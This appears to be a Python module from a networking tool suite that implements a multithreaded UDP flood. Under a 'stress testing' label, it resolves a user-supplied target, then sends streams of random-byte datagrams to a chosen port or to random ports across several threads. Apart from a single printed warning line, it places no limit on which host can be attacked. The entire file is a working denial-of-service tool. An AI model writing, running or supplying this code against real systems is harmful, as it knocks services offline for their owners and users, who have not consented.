import socket
import random
import threading
import color

DESCRIPTION = "UDP Flood Stress Testing Tool"
GROUP_ID = 1  # Networking Tools
COLOR = color.BLUE

def send_udp_packet(target_ip: str, target_port: int, packet_count: int, payload_size: int):
    """Send heavy streams of UDP packets to target port."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except Exception as e:
        return

    payload = random._urandom(payload_size)
    
    for _ in range(packet_count):
        try:
            port = target_port if target_port > 0 else random.randint(1, 65535)
            sock.sendto(payload, (target_ip, port))
        except Exception:
            pass

    sock.close()

def run():
    print(color.color_text("--- UDP Flood Stress Tool ---", COLOR))
    print(color.color_text("[!] Warning: Use only for authorized network stress testing and educational purposes.\n", color.RED))
    
    target = input("Enter target IP address or domain: ").strip()
    if not target:
        print(color.color_text("[!] Target cannot be empty.", color.RED))
        return

    try:
        target_ip = socket.gethostbyname(target)
    except Exception as e:
        print(color.color_text(f"[!] Could not resolve target: {e}", color.RED))
        return

    try:
        target_port = int(input("Enter target port (0 for random ports): ").strip() or "80")
        count = int(input("Enter packets per thread (e.g., 500): ").strip() or "500")
        threads_num = int(input("Enter number of concurrent threads (e.g., 5): ").strip() or "5")
        payload_size = int(input("Enter packet payload size in bytes (e.g., 512): ").strip() or "512")
    except ValueError:
        print(color.color_text("[!] Invalid numeric input provided.", color.RED))
        return

    print(color.color_text(f"\n[+] Starting UDP flood against {target_ip} using {threads_num} threads...\n", color.GREEN))

    threads = []
    for _ in range(threads_num):
        t = threading.Thread(target=send_udp_packet, args=(target_ip, target_port, count, payload_size))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(color.color_text(f"\n[+] UDP stress testing session finished.", color.CYAN))
